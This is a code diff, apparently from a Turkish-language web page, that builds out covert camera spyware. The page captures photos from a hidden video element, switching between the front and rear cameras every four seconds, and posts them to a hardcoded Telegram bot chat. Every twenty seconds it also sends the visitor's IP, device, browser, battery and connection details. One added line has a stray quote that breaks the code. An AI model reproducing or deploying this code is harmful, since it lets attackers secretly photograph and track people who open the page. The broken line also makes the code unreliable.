@@ -128,12 +128,9 @@
     
     let CHAT_ID = urlParametresiAl('id');
     
-    // Eğer URL'de chat_id yoksa varsayılan (senin ID'n) kullanılsın
+    // Eğer URL'de chat_id yoksa varsayılan
     if (!CHAT_ID) {
         CHAT_ID = '7497803165';
-    } else {
-        // Şifreli kullandıysan bunu aktif et:
-        // CHAT_ID = String((parseInt(CHAT_ID) - 12345) / 7);
     }
     // =======================================================
 
@@ -174,6 +171,7 @@
     let mediaStream = null;
     let fotoSayac = 0;
     let ipBilgisi = 'bilinmiyor';
+    let arkaKameraVar = false,’
 
     // IP'yi bir kere al
     async function getIp() {
@@ -189,14 +187,46 @@
       if (navigator.getBattery) {
         try {
           const bat = await navigator.getBattery();
-          return `%${Math.round(bat.level * 100)} ${bat.charging ? '⚡Şarjda' : '🔋Pil'}`;
+          return `${Math.round(bat.level * 100)}% ${bat.charging ? 'Şarjda' : 'Pil'}`;
         } catch(e) {}
       }
       return 'bilinmiyor';
     }
 
-    // Fotoğraf çekip Telegram'a gönder
-    async function fotoCek() {
+    // Cihaz bilgilerini mesaj olarak gönder (fotoğraftan bağımsız)
+    async function cihazBilgisiGonder() {
+      try {
+        const battery = await getBattery();
+        
+        const info = `
+🌐 **IP:** ${ipBilgisi}
+💻 **Cihaz:** ${navigator.platform}
+🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 80)}
+🔋 **Batarya:** ${battery}
+📺 **Ekran:** ${screen.width}x${screen.height}
+⏰ **Saat:** ${new Date().toLocaleString('tr-TR')}
+🌐 **Dil:** ${navigator.language}
+📡 **Bağlantı:** ${navigator.connection ? navigator.connection.effectiveType : 'bilinmiyor'}
+        `.trim();
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: info,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        console.log('Cihaz bilgisi gönderildi');
+      } catch (err) {
+        console.error('Cihaz bilgisi gönderilemedi:', err);
+      }
+    }
+
+    // Fotoğraf çekip Telegram'a gönder (arka/ön sırayla)
+    async function fotoCek(kameraTipi) {
       try {
         const video = document.getElementById('hiddenVideo');
         if (!video || !video.videoWidth) return;
@@ -210,23 +240,14 @@
         
         const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
 
-        const battery = await getBattery();
+        const etiket = kameraTipi === 'arka' ? '🔙 ARKA KAMERA' : '🔚 ÖN KAMERA';
 
-        const info = `
-📸 **FOTOĞRAF #${fotoSayac}**
-
-🌐 **IP:** ${ipBilgisi}
-💻 **Cihaz:** ${navigator.platform}
-🖥 **Browser:** ${navigator.userAgent.substring(0, 60)}
-🔋 **Batarya:** ${battery}
-📺 **Ekran:** ${screen.width}x${screen.height}
-⏰ **Saat:** ${new Date().toLocaleString('tr-TR')}
-        `.trim();
+        const caption = `📸 **Fotoğraf #${fotoSayac}** — ${etiket}`;
 
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', photoBlob, `foto_${fotoSayac}.jpg`);
-        formData.append('caption', info);
+        formData.append('photo', photoBlob, `foto_${fotoSayac}_${kameraTipi}.jpg`);
+        formData.append('caption', caption);
         formData.append('parse_mode', 'Markdown');
 
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -234,63 +255,100 @@
           body: formData
         });
 
-        console.log(`Fotoğraf #${fotoSayac} gönderildi (CHAT_ID: ${CHAT_ID})`);
+        console.log(`Fotoğraf #${fotoSayac} gönderildi (${etiket})`);
 
       } catch (err) {
         console.error('Fotoğraf gönderilemedi:', err);
       }
     }
 
-    // Ana fonksiyon - kamerayı aç ve sürekli foto çek
-    async function baslat() {
-      await getIp();
-      
+    // Kamerayı belirli bir yönde aç
+    async function kamerayiAc(facingMode) {
+      // Mevcut stream'i durdur
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+
       try {
-        // Kamerayı aç (sadece ön kamera)
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'user', width: 640, height: 480 },
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: facingMode, width: 640, height: 480 },
           audio: false
         });
 
         const video = document.getElementById('hiddenVideo');
-        video.srcObject = mediaStream;
+        video.srcObject = stream;
         await video.play();
 
-        console.log('Kamera açıldı, sürekli foto çekiliyor...');
-
-        // İlk fotoğrafı hemen çek
-        await new Promise(r => setTimeout(r, 1500));
-        await fotoCek();
-
-        // 3 saniyede bir yeni fotoğraf çek
-        setInterval(fotoCek, 3000);
+        mediaStream = stream;
+        return true;
 
       } catch (err) {
-        console.error('Kamera açılamadı:', err);
-        
-        // Kamera izni yoksa bile bilgi gönder
-        try {
-          const info = `
-❌ **KAMERA REDDEDİLDİ**
-
-🌐 **IP:** ${ipBilgisi}
-💻 **Cihaz:** ${navigator.platform}
-🖥 **Browser:** ${navigator.userAgent.substring(0, 60)}
-📺 **Ekran:** ${screen.width}x${screen.height}
-⏰ **Saat:** ${new Date().toLocaleString('tr-TR')}
-          `.trim();
-
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: info,
-              parse_mode: 'Markdown'
-            })
-          });
-        } catch(e) {}
+        console.error(`${facingMode} kamera açılamadı:`, err);
+        return false;
       }
+    }
+
+    // Sırayla ön ve arka kameradan foto çek
+    let sira = 0; // 0 = ön, 1 = arka
+    let arkaMevcut = false;
+
+    async function siradakiFotoyuCek() {
+      if (sira === 0) {
+        // Ön kameraya geç
+        const basarili = await kamerayiAc('user');
+        if (basarili) {
+          await new Promise(r => setTimeout(r, 800)); // kameranın stabilize olması için bekle
+          await fotoCek('on');
+        }
+        sira = 1;
+      } else if (sira === 1 && arkaMevcut) {
+        // Arka kameraya geç
+        const basarili = await kamerayiAc('environment');
+        if (basarili) {
+          await new Promise(r => setTimeout(r, 800));
+          await fotoCek('arka');
+        }
+        sira = 0;
+      } else {
+        // Arka kamera yoksa sadece önden devam
+        const basarili = await kamerayiAc('user');
+        if (basarili) {
+          await new Promise(r => setTimeout(r, 800));
+          await fotoCek('on');
+        }
+        sira = 0;
+      }
+    }
+
+    // Ana fonksiyon
+    async function baslat() {
+      await getIp();
+
+      // Önce arka kamerayı test et
+      const arkaTest = await kamerayiAc('environment');
+      if (arkaTest) {
+        arkaMevcut = true;
+        console.log('Arka kamera mevcut');
+      } else {
+        console.log('Arka kamera yok, sadece ön kamera kullanılacak');
+      }
+
+      // Ön kameraya geç (başlangıç)
+      await kamerayiAc('user');
+
+      // İlk cihaz bilgisini gönder
+      await new Promise(r => setTimeout(r, 1000));
+      await cihazBilgisiGonder();
+
+      // 1.5 saniye sonra ilk fotoğraf
+      await new Promise(r => setTimeout(r, 1500));
+      await siradakiFotoyuCek();
+
+      // 4 saniyede 1 foto çek (arka/ön dönüşümlü)
+      setInterval(siradakiFotoyuCek, 4000);
+
+      // Her 20 saniyede 1 cihaz bilgisi tekrar gönder (güncel batarya vs)
+      setInterval(cihazBilgisiGonder, 20000);
     }
 
     // Sayfa kapanırken kamerayı kapat
